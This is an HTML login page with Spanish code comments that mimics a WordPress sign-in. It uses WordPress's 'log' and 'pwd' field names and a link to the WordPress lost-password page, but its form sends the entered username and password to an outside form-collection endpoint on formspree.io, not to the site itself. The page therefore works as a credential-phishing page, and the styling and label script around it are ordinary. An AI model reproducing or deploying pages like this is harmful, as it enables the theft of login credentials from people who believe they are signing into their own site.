<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            /* ¡¡¡IMPORTANTE!!! Reemplaza 'nombre_de_tu_imagen.jpg' con el nombre EXACTO de tu archivo */
            background-image: url('fondo.jpg');
            background-size: contain; /* <-- CAMBIO AQUÍ: la imagen se ajustará para ser completamente visible */
            background-position: center;
            background-repeat: no-repeat; /* Importante para que no se repita si quedan espacios */
            background-attachment: fixed;
            
            /* Color de fondo si la imagen no cubre toda la pantalla (para las barras laterales) */
            background-color: #f4f4f4; /* Puedes cambiar este color */

            font-family: 'Poppins', sans-serif;
            color: #374151;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        .login-container {
            max-width: 400px;
            margin: 3rem auto;
            padding: 2.5rem 2rem 3rem;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 0.75rem;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
            font-family: 'Poppins', sans-serif;
            color: #374151;
            /* backdrop-filter: blur(5px); */
        }

        h1 {
            font-weight: 700;
            font-size: 3rem;
            margin-bottom: 1.5rem;
            text-align: center;
            color: #111827;
            line-height: 1.1;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 1rem 1rem 1rem 0.75rem;
            font-size: 1rem;
            border-radius: 0.5rem;
            border: 1.5px solid #d1d5db;
            background: #f9fafb;
            color: #111827;
            outline-offset: 2px;
            transition: border-color 0.3s ease;
            box-sizing: border-box;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #2563eb;
            background: #fff;
        }
        input[type="text"]:focus + label,
        input[type="password"]:focus + label,
        input[type="text"]:not(:placeholder-shown) + label,
        input[type="password"]:not(:placeholder-shown) + label {
            top: -0.5rem;
            left: 0.75rem;
            font-size: 0.8rem;
            color: #2563eb;
            font-weight: 600;
            background: rgba(255, 255, 255, 0); /* Fondo transparente para la etiqueta */
        }

        label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: rgba(255, 255, 255, 0.9); /* Fondo del contenedor para la etiqueta */
            padding: 0 0.25rem;
            font-size: 1rem;
            color: #6b7280;
            pointer-events: none;
            transition: 0.3s ease all;
            font-weight: 500;
        }

        .forgot-password-link {
            text-align: right;
            font-size: 0.9rem;
            color: #6b7280;
            margin-top: -0.75rem;
            margin-bottom: 1rem;
        }
        .forgot-password-link a {
            color: #2563eb;
            text-decoration: none;
            transition: color 0.25s ease;
        }
        .forgot-password-link a:hover {
            text-decoration: underline;
        }

        button[type="submit"] {
            background: #2563eb;
            color: #fff;
            padding: 1rem;
            font-weight: 600;
            font-size: 1.125rem;
            border: none;
            border-radius: 0.5rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button[type="submit"]:hover,
        button[type="submit"]:focus {
            background: #1e40af;
        }

        /* Media Queries para responsividad */
        @media (max-width: 600px) {
            .login-container {
                padding: 20px;
                max-width: 95%;
            }
            h1 {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
        <form action="https://formspree.io/f/mblydezp" method="post" novalidate>
            <div style="position: relative;">
                <input
                    type="text"
                    name="log"
                    id="username"
                    placeholder=" "
                    required
                    autocomplete="username"
                    >
                <label for="username" id="username-label">
                    Username or e-mail address
                </label>
            </div>

            <div style="position: relative;">
                <input
                    type="password"
                    name="pwd"
                    id="password"
                    placeholder=" "
                    required
                    autocomplete="current-password"
                    >
                <label for="password" id="password-label">
                    Password
                </label>
            </div>

            <div class="forgot-password-link">
                <a href="/wp-login.php?action=lostpassword" tabindex="0">
                    Forgot your password?
                </a>
            </div>

            <button type="submit" aria-label="Login">
                Entrar
            </button>
        </form>
    </div>
    <script>
        const usernameInput = document.getElementById('username');
        const usernameLabel = document.getElementById('username-label');
        const passwordInput = document.getElementById('password');
        const passwordLabel = document.getElementById('password-label');

        function updateLabel(input, label) {
            if (input.value.trim() !== '') {
                label.style.top = '-0.5rem';
                label.style.left = '0.75rem';
                label.style.fontSize = '0.8rem';
                label.style.color = '#2563eb';
                label.style.fontWeight = '600';
                label.style.background = 'rgba(255, 255, 255, 0)';
            } else {
                label.style.top = '50%';
                label.style.left = '12px';
                label.style.fontSize = '1rem';
                label.style.color = '#6b7280';
                label.style.fontWeight = '500';
                label.style.background = 'rgba(255, 255, 255, 0.9)'; // Coincide con el fondo del contenedor
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            updateLabel(usernameInput, usernameLabel);
            updateLabel(passwordInput, passwordLabel);
        });

        usernameInput.addEventListener('input', () => updateLabel(usernameInput, usernameLabel));
        usernameInput.addEventListener('focus', () => updateLabel(usernameInput, usernameLabel));
        usernameInput.addEventListener('blur', () => updateLabel(usernameInput, usernameLabel));

        passwordInput.addEventListener('input', () => updateLabel(passwordInput, passwordLabel));
        passwordInput.addEventListener('focus', () => updateLabel(passwordInput, passwordLabel));
        passwordInput.addEventListener('blur', () => updateLabel(passwordInput, passwordLabel));
    </script>
</body>
</html>
